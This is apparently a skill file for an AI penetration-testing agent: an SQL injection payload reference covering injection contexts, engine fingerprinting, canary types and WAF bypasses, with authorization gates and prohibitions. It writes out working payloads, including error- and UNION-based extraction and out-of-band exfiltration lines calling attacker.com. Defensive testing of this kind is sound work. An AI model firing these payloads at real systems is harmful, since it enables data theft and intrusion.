---
name: payload-reference-sqli
description: SQL injection reference framework — defensive taxonomy organized by injection context (SELECT, INSERT, UPDATE, DELETE, ORDER BY, LIMIT), database engine parsing differences, safe canary strategy for minimal-proof validation via differential behavior, and blind/OOB classification with no data extraction.
disable-model-invocation: true
risk: passive
allowed-modes: [auto, bug-bounty, red-team, ctf, blue-team, offensive, grey-hat, forensic, reverse-engineering, mobile-pentest]
authorization-required: conditional
evidence-outputs: [reference-notes, validation-plan, safe-canary-log, redaction-decision]
---

# Payload Reference SQLI

Use this skill as a defensive reference framework for SQL injection assessment. Organize payload knowledge by injection context (SELECT, INSERT, UPDATE, DELETE, ORDER BY, LIMIT, WHERE clause operators), database engine parsing differences (MySQL, PostgreSQL, MSSQL, Oracle, SQLite), and safe canary strategy. Every payload discussion maps to a minimal-proof approach — proving the injection exists via differential behavior or inert markers without extracting data, enumerating schemas, or escalating to command execution. This skill is a reference and triage aid. It never provides active exploitation runbooks. All active validation routes through `pentest_agent_execute_tool` with authorization, scope, and approval gates.

## Required inputs

- Injection context: the SQL clause where user input appears (WHERE, ORDER BY, LIMIT, SELECT columns, INSERT values, UPDATE SET, table name).
- Database engine hints: technology stack, ORM used, error messages observed, timing behavior, or explicit version info.
- Affected parameter, HTTP method, encoding (URL-encoded, JSON, multipart, GraphQL), and any observed WAF/filter behavior.
- Target and scope file when any live system, route, hostname, or account is mentioned.
- Authorization cache and allowed method before target contact.
- Desired output: validation plan, safe canary design, triage decision, or redaction guidance.

## Required gates

1. `pentest_agent_load_config` → `pentest_agent_validate_policy` to confirm local policy and disabled-category posture.
2. `pentest_agent_parse_scope` when target context exists.
3. `pentest_agent_validate_target` before any live URL, host, API, or account is contacted.
4. `pentest_agent_check_authorization` before active validation.
5. `pentest_agent_build_command` → `pentest_agent_execute_tool` for all active checks; never switch to raw shell.
6. `pentest_agent_append_evidence` for redacted notes when reference output informs engagement state.

## Defensive payload taxonomy

### Category 1 — injection context classification

Goal: identify the SQL clause context without injecting destructive syntax. Different contexts require different safe-canary strategies.

**WHERE clause injection** (most common):
- Context indicators: numeric parameter (`id=1`), string parameter (`name=admin`), boolean parameter (`active=true`).
- Safe canary: `1 AND 1=1` vs `1 AND 1=2` — differential response (content length, status code, presence of data) confirms injection without touching database content.
- String variant: `admin' AND '1'='1` vs `admin' AND '1'='2`.
- Comment terminator: append ` -- ` or ` # ` to neutralize trailing SQL.

**ORDER BY injection**:
- Context indicators: `sort=name`, `order=asc`, `sort_by=created_at`.
- Safe canary: `name, (SELECT 1)` — if the query executes, the second column expression confirms injection.
- Alternative: use `CASE WHEN (1=1) THEN name ELSE id END` to observe sorting changes without data extraction.

**LIMIT injection**:
- Context indicators: `limit=10`, `per_page=20`.
- Safe canary: `10 PROCEDURE ANALYSE()` (MySQL) — triggers a procedure call without data modification; informative for detection.
- Alternative: `10 UNION SELECT 1` if the injection point allows UNION extension.

**INSERT/UPDATE injection**:
- Context indicators: form submissions, profile updates, registration forms.
- Higher risk: these modify data. Validation must be non-destructive.
- Safe canary for INSERT: inject a value that produces a distinguishable error or timing change without committing malicious data — use a `CASE WHEN` expression inside a value that returns either a valid value or a recognizable error.
- Safe canary for UPDATE: use boolean-based differential in the SET clause — `SET name='test'+(SELECT CASE WHEN (1=1) THEN '' ELSE 'x' END)` where the response differs.

**SELECT column injection**:
- Context indicators: `/api/users?fields=id,name,email` where the field list is user-controlled.
- Safe canary: add `,(SELECT 1)` to the field list — if the extra column appears in the output or causes a column-count error, injection is confirmed.

### Category 2 — database engine fingerprinting via safe differentials

Goal: identify the database engine through inert differentials, not data extraction.

**MySQL/MariaDB**:
- `1 AND SLEEP(2) -- ` — time-based confirmation; 2-second delay confirms MySQL injection.
- `1 AND @@version LIKE '8%' -- ` — boolean-based version check; response difference confirms MySQL.
- `1 UNION SELECT 1,2,3 -- ` — UNION column-count discovery; each number confirms one output column.
- Identifier quoting: backtick (`table`).
- String concatenation: `CONCAT('a','b')`, not `||`.

**PostgreSQL**:
- `1 AND pg_sleep(2) -- ` — time-based confirmation; 2-second delay confirms PostgreSQL injection.
- `1 AND current_database() LIKE 'prod%' -- ` — boolean-based database name check.
- `1 UNION SELECT 1,2,3 -- ` — UNION column-count discovery.
- Identifier quoting: double quote (`"table"`).
- String concatenation: `'a' || 'b'`.
- Stacked queries supported by default in most drivers.

**Microsoft SQL Server**:
- `1; WAITFOR DELAY '0:0:2' -- ` — time-based confirmation; stacked-query required for WAITFOR.
- `1 AND @@version LIKE 'Microsoft%' -- ` — boolean-based version check.
- `1 UNION SELECT 1,2,3 -- ` — supported.
- Identifier quoting: square brackets (`[table]`).
- String concatenation: `'a' + 'b'`.
- `xp_cmdshell` for command execution (disabled by default in modern SQL Server) — reference only for defense.

**Oracle**:
- `1 AND DBMS_LOCK.SLEEP(2) FROM dual -- ` — time-based confirmation.
- `1 UNION SELECT 1,2,3 FROM dual -- ` — `FROM dual` is required.
- Identifier quoting: double quote (`"table"`).
- String concatenation: `'a' || 'b'`.

**SQLite**:
- `1 AND 1=1 -- ` — boolean-based only; no sleep function, no `INFORMATION_SCHEMA`.
- `1 UNION SELECT 1,2,3 -- ` — UNION works.
- `randomblob(100000000)` — CPU-intensive function for time-based detection without sleep.
- No identifier quoting needed for simple names.

### Category 3 — safe canary strategies by output type

Goal: choose the safest canary for the available output channel.

**Boolean-based canary (preferred — no data returned)**:
- Mechanism: inject a condition that changes the response without returning data.
- Pattern: `AND (SELECT CASE WHEN (condition) THEN 1 ELSE 0 END)=1`.
- Example: `1 AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE 0 END)=1` — confirms the `users` table exists without retrieving any rows.
- Validation limit: boolean canaries can only confirm existence of database objects, not their contents. Use when data extraction is out of scope.

**Error-based canary (extraction via error messages)**:
- Mechanism: trigger a type-conversion or constraint error that includes extracted data in the error text.
- Pattern (MySQL): `AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))` — extracts version in error.
- Pattern (PostgreSQL): `AND CAST(current_database() AS int)` — extracts database name in type-error.
- Risk: error messages may be logged server-side, revealing extraction activity. Use only when error-log access is not a concern.

**UNION-based canary (data appears in output)**:
- Mechanism: append a UNION SELECT that returns controlled values in the output columns.
- Pattern: `UNION SELECT 1,2,3 -- ` to discover column count; increase columns until no error.
- Pattern: `UNION SELECT 1,@@version,3 -- ` to extract version into the output.
- Risk: UNION output may be cached, logged, or trigger downstream processing of injected data. Prefer boolean canaries for validation.

**Time-based canary (no output, no error)**:
- Mechanism: inject a sleep/pause condition and measure response time.
- Pattern (MySQL): `AND IF(1=1, SLEEP(2), 0)`.
- Pattern (PostgreSQL): `AND CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END`.
- Risk: time-based canaries are slow (1 request per bit of information), noisy (increased server load), and error-prone (network latency noise). Use only when boolean and UNION channels are unavailable.

**Out-of-band (OOB) canary**:
- Mechanism: trigger a DNS or HTTP request from the database to an attacker-controlled listener.
- Pattern (MySQL, requires `secure_file_priv` unset): `LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\a'))` — DNS exfiltration.
- Pattern (MSSQL): `EXEC master..xp_dirtree '\\attacker.com\a'` — DNS request.
- Pattern (PostgreSQL): `COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'` — requires superuser.
- Risk: OOB requires outbound network access from the database — confirm scope permits outbound connections first. OOB is high-risk because it establishes an external data channel.

### Category 4 — second-order and stored injection

Goal: understand delayed-execution injection for defense and triage.

**Second-order SQLI concept**: user input is stored safely (parameterized INSERT), but later retrieved and concatenated into a new query without parameterization. The injection fires on retrieval, not on storage.

**Detection approach**: insert a benign payload into a profile field (e.g., display name) that, when displayed on a different page, triggers a differential. Example: set display name to `test' AND '1'='1` — if the profile page loads normally but the search page (which includes display name in a query) shows different results, second-order injection is confirmed.

**Safe canary for second-order**: the injected payload must be benign in both the storage context and the retrieval context. Use boolean differentials exclusively — never attempt UNION, error-based, or time-based in second-order unless the retrieval context explicitly supports it.

### Category 5 — WAF and filter bypass awareness (reference only)

Goal: understand filter-bypass techniques for defense assessment, not active exploitation.

**Comment obfuscation**: `1/**/AND/**/1=1` — inline comments between tokens bypass naive keyword filters.
**Case variation**: `1 and 1=1` — lowercase `and` bypasses case-sensitive filters looking for `AND`.
**Whitespace alternatives**: `1%0aAND%0a1=1` — newline (`%0a`) or tab (`%09`) instead of space.
**URL encoding**: `%31%20%41%4e%44%20%31%3d%31` — full URL-encoding of `1 AND 1=1`.
**Hex encoding**: `0x3120414e4420313d31` — hex-encoded `1 AND 1=1`.
**DB-specific functions as token substitutes**: MySQL `ORD()`, `CHAR()`, `CONV()`, `HEX()` to construct strings without quotes. PostgreSQL `CHR()` and `||` concatenation.
**No-equal sign techniques**: `1 AND NOT 1<>1` — substitutes `=` with negation of `<>`. `1 AND 1 BETWEEN 1 AND 1` — substitutes `=` with `BETWEEN`.

Reference only for defense assessment. Do not bypass WAFs in active testing without explicit scope authorization for WAF evasion.

## Decision points

- **Boolean canary succeeds → confirm injection**: record the context, engine, and canary used. Do not escalate to data extraction without separate authorization that permits reading database content.
- **Error-based canary reveals version → engine confirmed**: record the engine and version. Do not enumerate tables, columns, or rows beyond what is needed to confirm scope.
- **UNION canary discovers column count → confirm injection and output structure**: record column count. Do not extract data into the UNION output without data-extraction authorization.
- **Time-based canary is the only available channel → escalate caution**: time-based extraction is slow, noisy, and resource-intensive. Request operator confirmation before Time-based enumeration.
- **OOB channel required for detection → stop**: OOB requires outbound network and an external listener. Do not proceed without explicit OOB authorization proving the listener is your infrastructure and scope permits outbound connections.
- **Second-order injection suspected → separate engagement phase**: document the storage entry point and the retrieval point. Do not test second-order without scope covering both endpoints.

## Prohibited behavior

- Extracting rows from `users`, `passwords`, `sessions`, `credit_cards`, `tokens`, or any table containing credentials, PII, payment data, or authentication material.
- Enumerating table schemas beyond confirming the injection vector's reach (`INFORMATION_SCHEMA.TABLES` or `sys.tables` enumeration).
- Writing to the database (INSERT, UPDATE, DELETE, DROP, TRUNCATE, ALTER) in production environments or without write authorization.
- Using `INTO OUTFILE`, `INTO DUMPFILE`, `xp_cmdshell`, `COPY ... TO PROGRAM`, or any filesystem-access function.
- Chaining SQLI with SMB/UNC path injection to capture NetNTLM hashes.
- Using stacked queries on UPDATE/INSERT injection points in production data.
- Applying WAF bypass techniques against production WAFs without authorization.
- Providing step-by-step exploitation recipes beyond safe product behavior and defensive reference.

## Stop conditions

- Boolean canary fails after multiple context and encoding variations → stop, document SQLI not confirmed.
- Response includes row data from a sensitive table → stop, do not view or store the data, redact immediately.
- Error message includes database file paths, IP addresses, or internal hostnames → stop, redact from evidence.
- Time-based channel is the only option and scope limits rate → stop, request rate-limit guidance.
- OOB is required and outbound scope is not confirmed → stop, document that OOB validation is unavailable.

## Evidence

Record: affected parameter and injection context, database engine and version (if confirmed via safe canary), canary type (boolean/error/UNION/time), canary payload used, differential indicator, and redaction decisions. For boolean canaries, record the condition tested and the response difference observed without storing the response body content.

Never store: extracted database content, schema enumeration results, row data, error messages containing internal paths, version strings from non-safe contexts, or query logs containing credentials.

## Report handoff

1. When a SQL injection surface is confirmed, hand off to `vuln-sqli` for active validation with `pentest_agent_execute_tool`.
2. Reference this payload taxonomy in the finding as the detection rationale — link the canary type used, the DBMS identified, and the injection context.
3. If WAF bypass or encoding variants were identified, include them in the handoff notes to guide the active validator.
4. Recommend: parameterized queries (prepared statements) for all database access, stored procedures with defined parameter types, input type validation and allowlisting, least-privilege database user, and WAF rules tuned to the injection patterns observed.
